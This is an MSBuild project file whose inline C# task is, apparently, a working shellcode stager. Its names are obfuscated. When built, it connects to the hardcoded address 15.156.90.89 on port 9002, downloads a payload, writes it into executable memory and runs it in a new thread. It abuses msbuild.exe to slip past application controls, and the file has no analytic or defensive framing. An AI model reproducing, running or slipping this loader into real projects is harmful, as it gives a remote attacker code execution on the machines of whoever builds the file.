<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
<!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
        <Target Name="aAdARgjgR">
            <BEpqiJLxHnsV />
          </Target>
          <UsingTask
            TaskName="BEpqiJLxHnsV"
            TaskFactory="CodeTaskFactory"
            AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
            <Task>

              <Code Type="Class" Language="cs">
              <![CDATA[
        using System; using System.Net; using System.Net.Sockets; using System.Linq; using System.Runtime.InteropServices; using System.Threading; using Microsoft.Build.Framework; using Microsoft.Build.Utilities;
public class BEpqiJLxHnsV : Task, ITask {
                [DllImport("kernel32")] private static extern UInt32 VirtualAlloc(UInt32 uxsKfxnspJOT,UInt32 oHONYeXo, UInt32 wtMkPtRmVH, UInt32 VOEWBIE);
[DllImport("kernel32")]private static extern IntPtr CreateThread(UInt32 gkPEdIA, UInt32 gyHDGqtlkvzXf, UInt32 xILFjpEOrm,IntPtr iJqMUtdStwhY, UInt32 hzzUTv, ref UInt32 kvrJJyRvexIqar);
[DllImport("kernel32")] private static extern UInt32 WaitForSingleObject(IntPtr XstwPnSw, UInt32 fSCEMiNyABSkdD);
static byte[] BukGHcuLyAjywc(string ctEhyEVDSbO, int aFqGYZayza) {
    IPEndPoint zGBAyWtIJGHh = new IPEndPoint(IPAddress.Parse(ctEhyEVDSbO), aFqGYZayza);
    Socket LCdlJvahqfhjHG = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
    try { LCdlJvahqfhjHG.Connect(zGBAyWtIJGHh); }
    catch { return null;}
    byte[] mMVIsg = new byte[4];
    LCdlJvahqfhjHG.Receive(mMVIsg, 4, 0);
    int yrMJbIUDtbgJUj = BitConverter.ToInt32(mMVIsg, 0);
    byte[] iudiyrD = new byte[yrMJbIUDtbgJUj + 5];
    int tWTGIBiZAHimMb = 0;
    while (tWTGIBiZAHimMb < yrMJbIUDtbgJUj)
    { tWTGIBiZAHimMb += LCdlJvahqfhjHG.Receive(iudiyrD, tWTGIBiZAHimMb + 5, (yrMJbIUDtbgJUj - tWTGIBiZAHimMb) < 4096 ? (yrMJbIUDtbgJUj - tWTGIBiZAHimMb) : 4096, 0);}
    byte[] cWtNGu = BitConverter.GetBytes((int)LCdlJvahqfhjHG.Handle);
    Array.Copy(cWtNGu, 0, iudiyrD, 1, 4); iudiyrD[0] = 0xBF;
    return iudiyrD;}
static void DLigWAqWqDirwj(byte[] rTviuyS) {
    if (rTviuyS != null) {
        UInt32 jleYXLVTFgYx = VirtualAlloc(0, (UInt32)rTviuyS.Length, 0x1000, 0x40);
        Marshal.Copy(rTviuyS, 0, (IntPtr)(jleYXLVTFgYx), rTviuyS.Length);
        IntPtr dkrFPItEhuii = IntPtr.Zero;
        UInt32 GOELWUsfWQMmPx = 0;
        IntPtr HSJphxVS = IntPtr.Zero;
        dkrFPItEhuii = CreateThread(0, 0, jleYXLVTFgYx, HSJphxVS, 0, ref GOELWUsfWQMmPx);
        WaitForSingleObject(dkrFPItEhuii, 0xFFFFFFFF); }}

public override bool Execute()
{
    byte[] vXmsBEEm = null; vXmsBEEm = BukGHcuLyAjywc("15.156.90.89", 9002);
    DLigWAqWqDirwj(vXmsBEEm);

return true;            }       }
                                ]]>
                        </Code>
                </Task>
        </UsingTask>
</Project>                 
